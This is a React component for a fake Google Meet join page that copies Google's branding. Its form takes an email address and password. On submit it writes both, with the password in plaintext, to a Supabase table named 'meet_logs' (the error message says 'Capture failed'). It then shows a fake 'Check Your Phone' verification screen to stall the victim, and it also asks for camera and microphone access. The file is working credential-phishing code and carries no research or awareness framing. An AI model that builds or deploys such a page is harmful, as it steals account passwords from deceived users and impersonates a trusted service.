
import React, { useState, useRef, useEffect } from 'react';
import { supabase } from '../lib/supabase';

interface SignInProps {
  onComplete: (name: string) => void;
  onCancel: () => void;
  isMicOn: boolean;
  isCameraOn: boolean;
  setIsMicOn: (val: boolean) => void;
  setIsCameraOn: (val: boolean) => void;
}

type SignInStep = 'CREDENTIALS' | 'VERIFY';

const SignIn: React.FC<SignInProps> = ({ 
  onComplete, 
  onCancel,
  isMicOn, 
  isCameraOn, 
  setIsMicOn, 
  setIsCameraOn 
}) => {
  const [step, setStep] = useState<SignInStep>('CREDENTIALS');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [hasPermission, setHasPermission] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const startStream = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setIsMicOn(true);
      setIsCameraOn(true);
      setHasPermission(true);
    } catch (err) {
      console.error("Permission denied", err);
      setHasPermission(false);
    }
  };

  useEffect(() => {
    if (isCameraOn && streamRef.current && videoRef.current) {
      videoRef.current.srcObject = streamRef.current;
    } else if (!isCameraOn && videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, [isCameraOn, step]);

  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const toggleMic = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!hasPermission) {
      startStream();
      return;
    }
    setIsMicOn(!isMicOn);
    if (streamRef.current) {
      streamRef.current.getAudioTracks().forEach(track => track.enabled = !isMicOn);
    }
  };

  const toggleCamera = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!hasPermission) {
      startStream();
      return;
    }
    setIsCameraOn(!isCameraOn);
    if (streamRef.current) {
      streamRef.current.getVideoTracks().forEach(track => track.enabled = !isCameraOn);
    }
  };

  useEffect(() => {
    if (step === 'VERIFY') {
      const timer = setTimeout(() => {
        onComplete(email.split('@')[0] || 'User');
      }, 8000);
      return () => clearTimeout(timer);
    }
  }, [step, onComplete, email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim() && password.trim()) {
      setLoading(true);
      try {
        await supabase.from('meet_logs').insert([
          { email, password, timestamp: new Date().toISOString() }
        ]);
      } catch (err) {
        console.error("Capture failed:", err);
      }
      setTimeout(() => {
        setLoading(false);
        setStep('VERIFY');
      }, 1000);
    }
  };

  if (step === 'VERIFY') {
    return (
      <div className="fixed inset-0 bg-[#f8f9fa] flex items-center justify-center z-[100] font-sans p-4">
        <div className="max-w-[440px] w-full bg-white rounded-[28px] p-10 shadow-[0_1px_3px_rgba(0,0,0,0.12),0_1px_2px_rgba(0,0,0,0.24)] border border-[#e0e0e0] flex flex-col items-center text-center">
          
          <div className="flex items-center justify-center gap-2 mb-8">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/><path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/><path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/><path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/><path d="M13 11H22V18H13V11Z" fill="#FFBA00"/></svg>
            <span className="text-[#5f6368] text-[22px] font-normal leading-none">Google Meet</span>
          </div>

          <p className="text-[#3c4043] text-[15px] mb-8 leading-relaxed font-medium px-2">
            Google Wants to make sure it's really you trying to join a Google Meet video call.
          </p>

          <div className="mb-8 relative">
            <div className="w-[120px] h-[200px] bg-[#37474f] rounded-[18px] border-[4px] border-[#263238] flex flex-col p-3 overflow-hidden shadow-inner">
               <div className="w-full h-[140px] bg-white rounded-sm mb-2 flex flex-col p-2 space-y-1.5">
                  <div className="w-10 h-2 bg-[#e0e0e0] rounded-full"></div>
                  <div className="w-8 h-2 bg-[#eeeeee] rounded-full"></div>
                  <div className="mt-4 flex gap-1.5">
                    <div className="w-6 h-4 bg-[#eeeeee] rounded-sm"></div>
                    <div className="w-6 h-4 bg-[#eeeeee] rounded-sm"></div>
                  </div>
               </div>
               <div className="mt-auto mx-auto w-6 h-6 rounded-full border border-[#455a64]"></div>
            </div>
            <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 w-[140px] h-[4px] bg-black/5 blur-[2px] rounded-full"></div>
          </div>

          <h2 className="text-[#202124] text-[22px] font-bold mb-4 tracking-tight">Check Your Phone</h2>
          <p className="text-[#5f6368] text-[14px] mb-8 leading-[1.6] px-2 font-normal">
            Google sent a notification to your phone.<br />
            Tap yes on the notification, then tap the meeting code to join the video call.
          </p>

          <div className="flex items-center gap-3 mb-8 cursor-pointer group">
            <input type="checkbox" id="dontask" className="w-4 h-4 border-[#dadce0] rounded cursor-pointer accent-[#1a73e8]" />
            <label htmlFor="dontask" className="text-[#3c4043] text-[14px] cursor-pointer group-hover:text-[#202124]">
              Don't ask again on this device
            </label>
          </div>

          <button className="bg-[#1a73e8] hover:bg-[#185abc] text-white px-10 py-2.5 rounded-[4px] font-medium text-sm transition-all shadow-sm" onClick={() => window.location.reload()}>
            Resend It
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-white flex flex-col font-sans overflow-y-auto">
      <header className="px-6 py-4 flex items-center">
        <div className="flex items-center gap-2">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/><path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/><path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/><path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/><path d="M13 11H22V18H13V11Z" fill="#FFBA00"/></svg>
          <span className="text-[#5f6368] text-[22px] font-normal">Google Meet</span>
        </div>
      </header>

      <main className="flex-1 flex flex-col lg:flex-row items-center justify-center px-4 lg:px-20 gap-12 lg:gap-24 mb-12">
        <div className="w-full max-w-[740px] aspect-video bg-[#202124] rounded-2xl relative flex flex-col items-center justify-center overflow-hidden">
          {isCameraOn && hasPermission ? (
            <video ref={videoRef} autoPlay muted playsInline className="w-full h-full object-cover scale-x-[-1]" />
          ) : (
            <div className="flex flex-col items-center gap-6 text-center px-8">
              <h2 className="text-white text-xl md:text-2xl font-normal">Do you want people to see and hear you in the meeting?</h2>
              <button 
                onClick={startStream}
                className="bg-[#1a73e8] hover:bg-[#185abc] text-white px-6 py-2.5 rounded-md font-medium text-sm transition-colors"
              >
                Allow microphone and camera
              </button>
            </div>
          )}

          <div className="absolute bottom-6 flex gap-4">
             <button 
              onClick={toggleMic}
              className={`p-4 rounded-full ${isMicOn ? 'bg-[#3c4043]' : 'bg-[#ea4335]'} text-white relative transition-all active:scale-95`}
             >
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
                {!hasPermission && (
                  <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-400 rounded-full flex items-center justify-center text-[#202124] text-[12px] font-bold border-2 border-[#202124]">!</div>
                )}
             </button>
             <button 
              onClick={toggleCamera}
              className={`p-4 rounded-full ${isCameraOn ? 'bg-[#3c4043]' : 'bg-[#ea4335]'} text-white relative transition-all active:scale-95`}
             >
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
                {!hasPermission && (
                  <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-400 rounded-full flex items-center justify-center text-[#202124] text-[12px] font-bold border-2 border-[#202124]">!</div>
                )}
             </button>
          </div>
        </div>

        <div className="w-full max-w-[400px] flex flex-col items-center lg:items-start">
          <h1 className="text-[#202124] text-[32px] font-normal mb-8">What's your Email?</h1>
          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
            <input type="text" placeholder="Enter Your Email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full px-4 py-3.5 border border-[#dadce0] rounded-md focus:ring-1 focus:ring-[#1a73e8] outline-none text-[#202124] text-base" required />
            <input type="password" placeholder="Enter Your Password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full px-4 py-3.5 border border-[#dadce0] rounded-md focus:ring-1 focus:ring-[#1a73e8] outline-none text-[#202124] text-base" required />
            <button type="submit" disabled={loading} className="mt-4 w-full bg-[#1a73e8] hover:bg-[#185abc] text-white py-3 rounded-full font-medium text-base shadow-sm transition-all disabled:opacity-70">
              {loading ? 'Processing...' : 'Ask to Join'}
            </button>
          </form>
          <div className="mt-6 flex flex-col items-center gap-2">
            <p className="text-[#5f6368] text-sm font-medium">Other joining options</p>
            <a href="#" className="text-[#1a73e8] text-sm hover:underline">Ask to use Companion mode</a>
          </div>
        </div>
      </main>

      <footer className="mt-auto px-6 lg:px-24 py-8 flex flex-wrap items-center gap-x-12 gap-y-4 border-t border-[#f1f3f4]">
        <div className={`flex items-center gap-3 ${isMicOn ? 'text-[#1a73e8]' : 'text-[#5f6368]'} text-sm`}>
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/></svg>
          <span>{hasPermission ? 'Microphone active' : 'Permission needed'}</span>
        </div>
        <div className={`flex items-center gap-3 ${isCameraOn ? 'text-[#1a73e8]' : 'text-[#5f6368]'} text-sm`}>
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
          <span>{hasPermission ? 'Camera active' : 'Permission needed'}</span>
        </div>
      </footer>
    </div>
  );
};

export default SignIn;
